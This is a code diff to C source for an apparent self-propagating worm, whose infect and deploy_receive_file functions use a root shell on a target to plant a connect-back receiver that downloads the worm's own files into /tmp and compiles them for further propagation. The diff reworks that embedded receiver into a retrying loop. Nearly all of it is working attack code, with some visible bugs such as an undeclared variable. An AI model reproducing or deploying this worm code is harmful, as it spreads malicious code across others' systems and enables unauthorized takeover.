@@ -60,7 +60,7 @@ void get_local_ip(char *ip) {
 }
 
 /*
- * Deploys receive_file_bsd.c on target machine
+ * Deploys very slightly modified receive_file_bsd.c on target machine
  * sock - The active root shell
  * my_ip - The IP of the current machine for the target to connect back to
  */
@@ -100,8 +100,9 @@ void deploy_receive_file(int sock, char *my_ip) {
     "    *num = ntohl(ret); return 0;\n"
     "}\n\n"
     "int main() {\n"
-    "    int i, n, server_sock, file_size, len, num_files;\n"
-    "    struct sockaddr_in serv_addr; char io_buf[IO_BUF_SIZE], path[256];\n"
+    "    int i, j, n, server_sock, file_size, len, num_files;\n"
+    "    struct timeval tv; struct sockaddr_in serv_addr;\n"
+    "    char io_buf[IO_BUF_SIZE], path[256];\n"
     "    FILE *outfile; char *file_name;\n\n"
     "    server_sock = socket(AF_INET, SOCK_STREAM, 0);\n"
     "    if (server_sock < 0) return 1;\n"
@@ -109,25 +110,31 @@ void deploy_receive_file(int sock, char *my_ip) {
     "    serv_addr.sin_family = AF_INET; serv_addr.sin_port = htons(SERVER_PORT);\n"
     "    serv_addr.sin_addr.s_addr = inet_addr(SERVER_IP);\n\n"
     "    while (connect(server_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) sleep(1);\n\n"
-    "    write(server_sock, \"Hello\\n\", 6);\n"
-    "    if (receive_int(&num_files, server_sock) < 0) return 1;\n"
-    "    send_int(num_files, server_sock);\n\n"
-    "    for (i = 0; i < num_files; i++) {\n"
-    "        if (receive_int(&len, server_sock) < 0) break;\n"
-    "        file_name = (char *)malloc(len + 1);\n"
-    "        read(server_sock, file_name, len); file_name[len] = '\\0';\n"
-    "        sprintf(path, \"/tmp/%%s\", file_name);\n" // using %%s to preserve literal %s
-    "        outfile = fopen(path, \"w\");\n"
-    "        if (receive_int(&file_size, server_sock) >= 0) {\n"
-    "            while (file_size > 0) {\n"
-    "                n = read(server_sock, io_buf, (file_size < IO_BUF_SIZE) ? file_size : IO_BUF_SIZE);\n"
-    "                if (n <= 0) break;\n"
-    "                fwrite(io_buf, 1, n, outfile);\n"
-    "                file_size -= n;\n"
+    "    while (1) {\n"
+    "        write(server_sock, \"Hello from client!\\n\", 19);\n"
+    "        FD_ZERO(&read_fds); FD_SET(server_sock, &read_fds);\n"
+    "        tv.tv_sec = 5; tv.tv_usec = 0;\n"
+    "        if (select(server_sock + 1, &read_fds, (fd_set *)0, (fd_set *)0, &tv) > 0) {\n"
+    "            if (receive_int(&num_files, server_sock) < 0) continue;\n"
+    "            send_int(num_files, server_sock);\n"
+    "            for (i = 0; i < num_files; i++) {\n"
+    "                if (receive_int(&len, server_sock) < 0) continue;\n"
+    "                file_name = (char *)malloc((len + 1) * sizeof(char));\n"
+    "                n = read(server_sock, file_name, len); file_name[n] = '\\0';\n"
+    "                sprintf(path, \"/tmp/%%s\", file_name);\n"
+    "                outfile = fopen(path, \"w\");\n"
+    "                if (receive_int(&file_size, server_sock) < 0) continue;\n"
+    "                while (file_size > 0) {\n"
+    "                    n = read(server_sock, io_buf, IO_BUF_SIZE - 1);\n"
+    "                    if (n > 0) { io_buf[n] = '\\0'; fputs(io_buf, outfile); }\n"
+    "                    file_size -= n;\n"
+    "                }\n"
+    "                fclose(outfile); free(file_name);\n"
+    "                send_int(i, server_sock);\n"
     "            }\n"
+    "            write(server_sock, \"Files recieved\\n\", 15);\n"
+    "            break;\n"
     "        }\n"
-    "        fclose(outfile); free(file_name);\n"
-    "        send_int(i, server_sock);\n"
     "    }\n"
     "    close(server_sock); return 0;\n"
     "}\n";
@@ -215,7 +222,7 @@ void infect(char *ip, char *my_ip) {
 		exit(1);  /* If execv fails */
 	}
 
-    //compile send_file_over_socket on target for next propogation (dont need, just send binary)
+    // compile send_file_over_socket on target for next propogation (dont need, just send binary)
 	// write_to_sock(sock, "cc /tmp/send_file_over_socket.c -o /tmp/send_file_over_socket\n");
 
     // Compile and run receive_file, should pull in worm.c, worm.h, and send_file_over_socket.c from attacker
